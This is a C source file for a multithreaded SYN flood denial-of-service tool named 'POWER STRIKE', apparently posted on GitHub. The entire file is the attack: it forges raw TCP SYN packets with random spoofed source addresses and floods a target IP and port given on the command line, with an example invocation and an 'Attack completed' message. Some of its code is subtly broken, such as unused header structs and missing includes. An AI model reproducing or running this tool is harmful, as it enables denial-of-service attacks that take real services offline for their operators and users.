#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

// GitHub.com/scallydima

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int threads;
} syn_params;

struct tcp_header {
    unsigned short src_port;
    unsigned short dst_port;
    unsigned int seq_num;
    unsigned int ack_num;
    unsigned char data_offset;
    unsigned char flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_ptr;
};

struct pseudo_header {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcp_header tcp;
};

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;
    
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

void *syn_flood(void *arg) {
    syn_params *params = (syn_params *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    time_t end_time = time(NULL) + params->duration;
    unsigned int seq = rand();
    unsigned int src_ip;
    
    while (time(NULL) < end_time) {
        src_ip = rand() | (rand() << 16);
        
        memset(packet, 0, 4096);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = rand();
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = src_ip;
        iph->daddr = dest.sin_addr.s_addr;
        
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(params->target_port);
        tcph->seq = htons(seq++);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        sendto(sock, packet, iph->tot_len, 0, 
               (struct sockaddr *)&dest, sizeof(dest));
    }
// GitHub.com/scallydima
// GitHub.com/scallydima
// GitHub.com/scallydima
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔════════════════════════════════════════╗\n");
    printf("║             POWER STRIKE               ║\n");
    printf("╚════════════════════════════════════════╝\n\n");
    
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60 50\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    
    syn_params params;
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.threads = atoi(argv[4]);
    strcpy(params.target_ip, argv[1]);
    
    printf("[+] Target: %s:%d\n", params.target_ip, params.target_port);
    printf("[+] Duration: %d seconds\n", params.duration);
    printf("[+] Threads: %d\n", params.threads);
    printf("[+] Mode: SYN Flood\n\n");
    
    pthread_t threads[params.threads];
    
    for (int i = 0; i < params.threads; i++) {
        pthread_create(&threads[i], NULL, syn_flood, &params);
        usleep(1000);
    }
    
    for (int i = 0; i < params.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[+] Attack completed\n");
    return 0;
}